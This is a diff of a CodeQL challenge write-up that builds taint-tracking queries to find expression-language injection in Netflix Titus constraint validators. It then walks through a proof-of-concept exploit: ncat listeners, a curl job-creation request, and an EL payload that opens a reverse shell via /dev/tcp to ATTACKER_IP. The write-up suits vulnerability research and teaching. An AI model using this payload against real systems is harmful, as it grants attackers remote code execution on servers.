@@ -1,6 +1,164 @@
-Step 4: Exploit and remediation
 
-Step 4.1: PoC
+For explaining Step 1-3 I'll be giving the relevant, commented portion of the query for each step. A brief explanation will be there if needed.
+All the raw queries that I developed sequentially while solving the steps are available in [codeql/](codeql/)(One _may_ find an easter egg or two there).
+
+## Step 1: Data flow and taint tracking analysis
+
+### Step 1.1: Sources
+
+```codeql
+predicate isSource(DataFlow::Node source) {
+  exists(Method overriding, Method overridden|
+    // the isValid we are looking for should be an overriding method 
+    overriding.overrides(overridden) and 
+    // the method which is overridden should match the pattern
+    overridden.getQualifiedName().matches("ConstraintValidator<%,%>.isValid") and
+    // source would be the first parameter of the overriding method
+    source.asParameter() = overriding.getParameter(0)
+  )
+}
+```
+
+Quick Eval gives-
+
+![6 Results](images/query/1.1.png)
+
+### Step 1.2: Sink
+
+```codeql
+predicate isSink(DataFlow::Node sink) {
+  exists(Call c|
+    // first argument of the call will be sink
+    c.getArgument(0) = sink.asExpr() and 
+    // the calls of this function are the ones we're interested in
+    c.getCallee().getQualifiedName() = "ConstraintValidatorContext.buildConstraintViolationWithTemplate"
+  )
+}
+```
+
+Quick Eval Gives-
+
+![5 Results](images/query/1.2.png)
+
+### Step 1.3: TaintTracking configuration
+
+```codeql
+/** @kind path-problem */
+import java
+import semmle.code.java.dataflow.TaintTracking
+import DataFlow::PathGraph
+
+class ELInjectionTaintTrackingConfig extends TaintTracking::Configuration {
+    ELInjectionTaintTrackingConfig() { this = "ELInjectionTaintTrackingConfig" }
+
+    override predicate isSource(DataFlow::Node source) { ... }
+
+    override predicate isSink(DataFlow::Node sink) { ... }
+}
+
+from ELInjectionTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
+where cfg.hasFlowPath(source, sink)
+select sink, source, sink, "Custom constraint error message contains unsanitized user data"
+```
+
+Running Query gives-
+
+![0 Results](images/query/1.3.png)
+
+:(
+
+### Step 1.4: Partial Flow to the rescue
+
+```codeql
+
+/**
+* @kind path-problem
+*/
+import java
+import semmle.code.java.dataflow.TaintTracking
+import DataFlow::PartialPathGraph // this is different!
+
+class ELInjectionTaintTrackingConfig extends TaintTracking::Configuration {
+    ELInjectionTaintTrackingConfig() { this = "ELInjectionTaintTrackingConfig" } // same as before
+    override predicate isSource(DataFlow::Node source) // same as before
+    { ... }
+    override predicate isSink(DataFlow::Node sink) // same as before
+    { ... }
+    override int explorationLimit() { result =  10} // this is different!
+}
+from ELInjectionTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
+where
+  cfg.hasPartialFlow(source, sink, _) and
+    exists(Method m|
+        // The function whose first parameter will be our source for partial flow checking
+        m.getQualifiedName() = "SchedulingConstraintSetValidator.isValid" and
+        source.getNode().asParameter() = m.getParameter(0)
+    )
+select sink, source, sink, "Partial flow from unsanitized user data"
+```
+
+Running Query gives-
+
+![8 Results](images/query/1.4.png)
+
+### Step 1.5: Identifying a missing taint step
+
+This step required me to talk!?!?!
+So be it ¯\\\_(ツ)\_/¯
+
+The first 4 results in the previous step concern us, so lets have a look at them-
+
+![Partial Query Locations](images/query/1.4.locs.png)
+
+It can be seen that taint doesn't propagate through methods `getHardConstraints` and `getSoftConstraints` and my sixth sense says that the same would happen for `keySet`
+
+Now that I've found the beast, It is time to kill it!
+
+### Step 1.6: Adding additional taint steps
+
+So I added the required `step` predicate to both my normal flow tracking query and partial flow tacking query-
+
+```codeql
+class CustomAdditionalStep extends TaintTracking::AdditionalTaintStep {
+    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
+        exists(MethodAccess ma, Callable c |
+            // spreead taint from the method access' qualifier
+            node1.asExpr() = ma.getQualifier() and
+            // to the method access
+            node2.asExpr() = ma and
+            c = ma.getCallee() and
+            // if
+            (
+                (
+                    // method accessed belongs to these
+                    c.getQualifiedName() in ["Container.getSoftConstraints", "Container.getHardConstraints"] 
+                // or ¬‿¬
+                ) or
+                (
+                    // it is an access of these methods
+                    c.getName() in ["keySet"] and
+                    // from a type which inherits from this type
+                    c.getDeclaringType().getASupertype().getQualifiedName().matches("java.util.Map<%>")
+                )
+            )
+        )
+    }
+}
+```
+
+Running Normal Flow Query-
+
+![0 Results](images/query/1.6.1.png)
+
+:(
+Running Partial Flow Query-
+
+
+
+
+## Step 4: Exploit and remediation
+
+### Step 4.1: PoC
 
 To get a shell, you'll need a system with ports 5060, 2222 free(and allowed through firewall). Also DO NOT change the port numbers anywhere as they _might_ interfere with payload logic
 
@@ -8,7 +166,7 @@ Replace the following texts-
 - HOST_IP: with host IP Address or domain name
 - ATTACKER_IP: with your IP Address or domain name
 
-### Step 1
+#### Step 1
 Now first get on 2 shells on your system and run-
 ```bash
 ncat -k -l -p 5060
@@ -16,7 +174,7 @@ ncat -k -l -p 2222
 ```
 (I like ncat, but netcat's cool as well)
 
-### Step 2
+#### Step 2
 Now run this curl request from anywhere and replace HOST_IP and ATTACKER_IP
 ```bash
     curl --location --request POST 'HOST_IP:7001/api/v3/jobs' \
@@ -39,19 +197,19 @@ Now run this curl request from anywhere and replace HOST_IP and ATTACKER_IP
     }'
 ```
 
-### Step 3
+#### Step 3
 Run any `sh` command into the `5060` ncat connection
 
-### Step 4
+#### Step 4
 ???
 
-### Step 5
+#### Step 5
 
-#### PROFIT
+### PROFIT
 
 ![An innocent application getting pwned](images/pwn.png)
 
-### So what does that all gobbled up thingy do?
+#### So what does that all gobbled up thingy do?
 
 First step- How did I figured this JSON and the endpoint out. Thanks to netflix, they have a complete API documentation in their [titus-api-definitions](https://github.com/Netflix/titus-api-definitions) repository. The CodeQL shenanigans showed vulnerability in the constraint validator of the fields `softConstraints` and `hardConstraints` of Container class. So, if there's an endpoint that deserializes user controlled Container class, I get one step closer to RCE. One such enpoint is the endpoint that creates jobs using Job Descriptors, which in turn contains a Container - Bingo. All I had to do was to convert this [protobuf specification](https://github.com/Netflix/titus-api-definitions/blob/master/src/main/proto/netflix/titus/titus_job_api.proto) to REST JSON.
 
@@ -88,7 +246,7 @@ Which is a twisted way to run-
 ```java
 ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"/bin/bash -c sh</dev/tcp/ATTACKER_IP/5060>/dev/tcp/ATTACKER_IP/2222\\\")"))}'
 ```
-(this payload was taken from that expoit DB report or this [security lab report](https://securitylab.github.com/advisories/GHSL-2020-030-dropwizard) or perhaps both ¯\\_(ツ)_/¯)
+(this payload was taken from that expoit DB report or this [security lab report](https://securitylab.github.com/advisories/GHSL-2020-030-dropwizard) or perhaps both ¯\\\_(ツ)\_/¯)
 
 To deal with the UpperCase issue I came up with 2 solutions-
 
